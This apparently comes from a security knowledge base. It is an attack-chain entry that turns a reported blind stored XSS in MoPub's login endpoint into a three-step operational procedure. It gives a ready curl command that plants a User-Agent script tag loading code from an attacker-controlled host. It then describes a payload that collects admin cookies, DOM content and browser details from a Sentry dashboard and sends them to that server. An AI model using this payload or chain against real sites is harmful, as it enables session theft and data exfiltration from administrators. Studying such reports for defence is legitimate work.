---
tags:
  - xss
  - blind-xss
  - stored-xss
  - mopub
  - sentry
  - javascript-execution
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Inject-Blind-XSS-Payload-via-User-Agent-Header]]'
  - '[[procedures/Trigger-Payload-in-Sentry-Admin-Dashboard]]'
  - '[[procedures/Monitor-and-Exfiltrate-Sensitive-Data]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:49.986Z'
description: >-
  Multi-stage attack exploiting a Blind Stored XSS vulnerability in the MoPub
  login endpoint's User-Agent header processing, leading to arbitrary JavaScript
  execution in the Sentry admin dashboard and sensitive data exfiltration from
  Twitter staff browsers.
skill_level: intermediate
impact_level: high
id: fce92f67-da3c-41ce-8eda-06d5694ca0a3
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Blind Stored XSS via User-Agent Header in MoPub for Admin Dashboard Compromise

Multi-stage attack chain demonstrating a complete attack workflow exploiting a Blind Stored XSS in the MoPub login endpoint, reflected unsafely in the Marketplace Admin Production Sentry dashboard, allowing arbitrary JavaScript execution in the administrative context to steal sensitive data from Twitter staff browsers.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Inject XSS Payload via User-Agent] --> B[Admin Accesses Sentry Dashboard]
    B --> C[Payload Executes and Exfiltrates Data]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- None (uses standard HTTP client like curl)

### Target Environment

- Web platform
- Services: MoPub demand.mopub.com and Sentry sentry-test.mopub.com
- No specific ports required beyond standard HTTPS (443)

### Initial Access Requirements

- Ability to send HTTPS requests to https://demand.mopub.com/accounts/login/
- Control over an external domain (e.g., attacker.com) to host the malicious JavaScript payload
- No credentials needed for injection; admin access to dashboard for triggering

## Detailed Attack Procedures

### Step 1: Inject Blind XSS Payload
procedure: [[procedures/Inject-Blind-XSS-Payload-via-User-Agent-Header]]

**Objective**: Plant a Blind Stored XSS payload in the User-Agent header during login request processing, which gets stored and reflected later in the admin dashboard.

**Instructions**: Craft and send an HTTPS GET request to the MoPub login endpoint with the XSS payload in the User-Agent header. Use [[commands/inject-xss-user-agent-mopub]] to perform the injection:

```bash
curl -X GET "https://demand.mopub.com/accounts/login/" \
  -H "Host: demand.mopub.com" \
  -H "Referer: 1" \
  -H "User-Agent: '>"</title></style></textarea></script><script/src=attacker.com/js></script>" \
  -H "X-Forwarded-For: 1" \
  -H "X-OrigHost: demand.mopub.com" \
  -H "Accept-Encoding: gzip,deflate" \
  -H "Accept: */*"
```

Replace `attacker.com/js` with your controlled domain hosting the JavaScript payload for logging hits and data exfiltration.

**Expected Output**: The request is processed without error; the payload is stored for later reflection in the Sentry dashboard.

**Success Indicators**:
- HTTP 200 or redirect response indicating successful processing
- No immediate payload execution (blind nature)

### Step 2: Trigger Payload Execution
procedure: [[procedures/Trigger-Payload-in-Sentry-Admin-Dashboard]]

**Objective**: Simulate or wait for an admin to log in and access the vulnerable dashboard page, causing the stored payload to reflect and execute.

**Instructions**: As an attacker, you cannot directly trigger this, but monitor for admin activity. In a testing scenario, log in to the Sentry dashboard with admin credentials and navigate to the vulnerable page. Use a browser or tool to access http://sentry-test.mopub.com/ and then http://sentry-test.mopub.com/exchange-marketplace/marketplace-admin-production/.

No specific command needed here; it's passive waiting or simulated access.

**Expected Output**: Upon page load, the User-Agent payload reflects inside an <option> tag, escaping the context and loading the external script.

**Success Indicators**:
- Script request hits your controlled server (first hit for download)
- JavaScript executes in the admin browser context

### Step 3: Exfiltrate Sensitive Data
procedure: [[procedures/Monitor-and-Exfiltrate-Sensitive-Data]]

**Objective**: Capture and extract sensitive information like DOM content, cookies, user IP, and browser details sent back from the executing payload.

**Instructions**: Host a logging server on your domain (e.g., attacker.com/js) that captures incoming requests from the payload. The JavaScript should extract data using `document.body.innerHTML`, `document.cookie`, and navigator details, then send via XMLHttpRequest or image beacon to your server.

Monitor server logs for hits; expect two requests: one for script load, one for data exfil.

**Expected Output**: Logs showing downloaded script and exfiltrated data including admin cookies, IP, and DOM snippets from Twitter staff browsers.

**Success Indicators**:
- Incoming requests to your server with sensitive data
- Confirmation of arbitrary JS execution in high-privilege context

## Attack Chain Summary

### Key Achievements

1. Successful injection of Blind Stored XSS payload without detection
2. Arbitrary JavaScript execution in the MoPub Marketplace Admin Production Sentry dashboard
3. Exfiltration of sensitive administrative data from Twitter staff browsers, including cookies and IP addresses

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]
- [[Collection]]

---
*Last updated: 2023-10-01T00:00:00Z*
